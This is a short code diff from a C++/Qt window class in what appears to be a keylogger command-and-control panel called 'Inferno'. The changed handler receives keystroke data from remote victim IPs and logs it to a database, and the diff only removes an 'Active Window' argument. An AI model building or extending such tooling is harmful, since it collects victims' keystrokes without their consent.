@@ -403,7 +403,7 @@ void MainWindow::onKeylogReceived(const QString& ip, const QString& data) {
     }
 
     // Log to Database (Circle 5)
-    Inferno_Database::instance().logKeylog(uuid, "Active Window", data);
+    Inferno_Database::instance().logKeylog(uuid, data);
 
     QString timestamp = QDateTime::currentDateTime().toString("HH:mm:ss");
     QString line = QString("[%1] [%2] %3").arg(timestamp, ip, data);
